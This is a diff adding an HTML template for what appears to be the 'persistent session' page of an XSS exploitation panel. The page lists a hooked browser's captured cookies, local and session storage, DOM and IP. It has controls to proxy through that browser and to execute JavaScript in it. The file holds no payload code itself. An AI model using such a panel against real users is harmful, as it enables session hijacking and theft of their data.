@@ -1,0 +1,180 @@
+<div class="wrapper">
+
+    {menu}
+
+    <section class="content" {%!if isLoggedIn}style="margin-left:0px"{%/!if}>
+        <div class="container-fluid">
+            <div class="row">
+                <div class="col-lg-12">
+                    <div class="view-header">
+                        <div class="header-title">
+                            <h3 class="m-b-xs">Persistent session</h3>
+                            <small>The session page allows you to manage, proxy, and delete your session. Also holds all the information like URL, cookies, HTML DOM and more.
+                            </small>
+                        </div>
+                    </div>
+                    <hr>
+                </div>
+            </div>
+
+            {message}
+
+            <div class="row">
+                <div class="col-lg-6">
+                    <div class="panel panel-filled">
+                        <div class="panel-heading">Session data</div>
+                        <div class="panel-body">
+                            <table class="table report">
+                                <thead>
+                                    <tr>
+                                        <td width=150px>Client ID</td>
+                                        <td>{%data clientid}</td>
+                                    </tr>
+                                    <tr>
+                                        <td>IP</td>
+                                        <td>{%data ip}</td>
+                                    </tr>
+                                    <tr>
+                                        <td>Browser</td>
+                                        <td>{%data browser}</td>
+                                    </tr>
+                                    <tr>
+                                        <td>Payload</td>
+                                        <td>{%data payload}</td>
+                                    </tr>
+                                    <tr>
+                                        <td>Origin</td>
+                                        <td>{%data origin}</td>
+                                    </tr>
+                                    <tr>
+                                        <td>Requests</td>
+                                        <td><a href="/manage/persistent/requests/{%data clientid}~{%data origin}">{%data requests}</a></td>
+                                    </tr>
+                                    <tr>
+                                        <td>Last online</td>
+                                        <td>{%data last}</td>
+                                    </tr>
+                                </thead>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="col-lg-6">
+                    <div class="panel panel-filled">
+                        <div class="panel-heading">Reverse proxy</div>
+                        <div class="panel-body">
+                            <form class="form" method="post">
+                                <input type=hidden hidden name="csrf" value="{session[csrfToken]}">
+                                <div class="form-group">
+                                    <label class="control-label" for="ipport">Proxy domain and port</label>
+                                    <input class="form-control" name="ipport" type="text" placeholder="{domain[]}:30055">
+                                </div>
+
+                                <label class="checkbox-label">
+                                    <input checked class="chkbox" name="passorigin" type="checkbox">
+                                    <span class="checkbox-custom rectangular"></span>
+                                </label>
+                                <p class="checkbox-text">Pass origin requests through proxy</p>
+
+                                <button name="proxy" type="submit" class="btn">Start</button>
+                            </form>
+                        </div>
+                    </div>
+
+                    <div class="panel panel-filled">
+                        <div class="panel-heading">Settings</div>
+                        <div class="panel-body" style="padding:19px">
+                            <form class="form" method="post">
+                                <input type=hidden hidden name="csrf" value="{session[csrfToken]}">
+                                <button name="delete" type="submit" class="btn">Delete</button>
+                                <button name="kill" type="submit" class="btn">Kill persistent</button>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="row">
+                <div class="col-lg-12">
+                    <div class="panel panel-filled">
+                        <div class="panel-heading">Console</div>
+                        <div class="panel-body">
+                            <div class="form-group">
+                                <textarea class="form-control" name="console" id="console" rows=5>{%data console}</textarea>
+                            </div>
+
+                            <div class="form-group">
+                                <label class="control-label" for="secret">Execute javascript</label>
+                                <div class="input-group">
+                                    <input type="text" name="command" id="command" placeholder="console.log(1);"
+                                        class="form-control">
+                                    <span class="input-group-addon"><a name="execute" id="execute" style="cursor:pointer">Send</a></span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="col-lg-12">
+                    <div class="panel panel-filled">
+                        <div class="panel-heading">Last request</div>
+                        <div class="panel-body">
+                            <div>
+                                <table class="table report">
+                                    <thead>
+                                        <tr>
+                                            <td width=150px>URL</td>
+                                            <td>{%data uri}</td>
+                                        </tr>
+                                        <tr>
+                                            <td>IP</td>
+                                            <td>{%data ip}</td>
+                                        </tr>
+                                        <tr>
+                                            <td>Referer</td>
+                                            <td>{%data referer}</td>
+                                        </tr>
+                                        <tr>
+                                            <td>User Agent</td>
+                                            <td>{%data user-agent}</td>
+                                        </tr>
+                                        <tr>
+                                            <td>Cookies</td>
+                                            <td id="cookies">{%data cookies}</td>
+                                        </tr>
+                                        <tr>
+                                            <td>Local Storage</td>
+                                            <td style="padding-right:0px"><textarea spellcheck=false
+                                                    style="resize:vertical" class="form-control"
+                                                    rows="2">{%data localstorage}</textarea>
+                                            </td>
+                                        </tr>
+                                        <tr>
+                                            <td>Session Storage</td>
+                                            <td style="padding-right:0px"><textarea spellcheck=false
+                                                    style="resize:vertical" class="form-control"
+                                                    rows="2">{%data sessionstorage}</textarea>
+                                            </td>
+                                        </tr>
+                                        <tr>
+                                            <td>DOM</td>
+                                            <td style="padding-right:0px"><textarea spellcheck=false
+                                                    style="resize:vertical" class="form-control" rows="12.5"
+                                                    id="dom">{%data dom}</textarea>
+                                            </td>
+                                        </tr>
+                                        <tr>
+                                            <td>Time</td>
+                                            <td>{%data time}</td>
+                                        </tr>
+                                    </thead>
+                                </table>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+</div>
